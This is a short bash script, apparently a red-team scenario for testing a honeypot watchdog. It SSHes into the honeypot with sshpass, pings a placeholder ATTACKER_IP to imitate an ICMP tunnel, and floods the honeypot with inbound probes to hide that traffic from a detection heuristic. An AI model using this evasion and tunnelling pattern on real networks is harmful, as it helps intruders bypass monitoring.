#!/usr/bin/env bash
# A3 — ICMP "tunnel" to attacker. Sustained inbound probe traffic
# is generated alongside to mask the watchdog's rx-without-tx
# heuristic — this is the case Appendix E.8 documents.
set -euo pipefail
: "${POT_IP:?}"; : "${POT_USER:?}"; : "${POT_PASS:?}"
ATTACKER_IP="${ATTACKER_IP:-10.10.42.200}"

# Background flooder: 50 inbound probes/sec for 10 s to mask
# the asymmetry condition.
( for _ in $(seq 1 500); do
    timeout 0.05 bash -c "exec 3</dev/tcp/$POT_IP/80" || true
  done ) &
FLOOD=$!

sshpass -p "$POT_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    "$POT_USER@$POT_IP" "ping -c 20 -i 0.5 $ATTACKER_IP || true"

wait "$FLOOD" 2>/dev/null || true
